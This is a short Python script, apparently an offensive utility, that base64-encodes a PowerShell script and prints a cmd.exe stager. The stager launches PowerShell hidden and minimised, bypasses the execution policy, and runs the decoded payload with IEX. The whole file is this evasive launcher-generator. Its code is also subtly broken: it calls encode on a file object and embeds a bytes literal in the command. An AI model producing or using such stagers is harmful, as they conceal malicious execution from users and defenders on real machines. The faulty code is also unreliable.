#!/usr/bin/python3.7
import argparse
import base64

def arguments():
    parser = argparse.ArgumentParser(prog="powershell_cmd_stager")
    parser.add_argument("POWERSHELL_SCRIPT", help="Name of the .ps1 script to generate stager for")
    return parser.parse_args()

def main():
    res = arguments()
    script_encoded = base64.b64encode(open(res.POWERSHELL_SCRIPT).encode("utf-8")) 
    cmd_stager = f"""
    %comspec% /b /c start /b /min powershell -nop -ep bypass -w hidden -c "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String({script_encoded})))"
    """
    print(cmd_stager)

if __name__ == "__main__":
    main()
